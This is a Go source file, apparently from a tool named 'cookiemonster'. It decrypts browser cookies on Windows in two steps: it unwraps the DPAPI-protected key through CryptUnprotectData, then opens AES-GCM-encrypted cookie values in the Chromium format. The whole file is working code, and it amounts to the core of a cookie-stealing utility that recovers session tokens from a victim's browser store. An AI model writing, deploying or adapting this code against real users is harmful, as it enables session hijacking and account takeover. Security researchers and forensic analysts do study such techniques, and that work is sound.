package cookiemonster

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"syscall"
	"unsafe"
)

// DATA_BLOB structure
type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

var (
	crypt32DLL       = syscall.NewLazyDLL("Crypt32.dll")
	procDecryptDPAPI = crypt32DLL.NewProc("CryptUnprotectData")
)

func DecryptDPAPI(blob []byte) ([]byte, error) {

	dataIn := DATA_BLOB{
		cbData: uint32(len(blob)),
		pbData: &blob[0],
	}

	var dataOut DATA_BLOB

	// Call CryptUnprotectData
	r, _, err := procDecryptDPAPI.Call(
		uintptr(unsafe.Pointer(&dataIn)),
		uintptr(0),
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&dataOut)),
	)
	if r == 0 {
		fmt.Printf("cryptUnprotectData failed with %v\n", err)
		return nil, err
	}

	// Convert decrypted data to Go byte slice
	decryptedData := make([]byte, dataOut.cbData)
	copy(decryptedData, (*[1 << 30]byte)(unsafe.Pointer(dataOut.pbData))[:dataOut.cbData])

	return decryptedData, nil
}

func DecryptEncryptedCookieValue(cookieValue, bmeKey []byte) (string, error) {
	if len(cookieValue) < 15 {
		return "", fmt.Errorf("invalid cookie value")
	}

	iv := cookieValue[3:15]
	payload := cookieValue[15:]
	block, err := aes.NewCipher(bmeKey)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	decrypted, err := gcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil

}
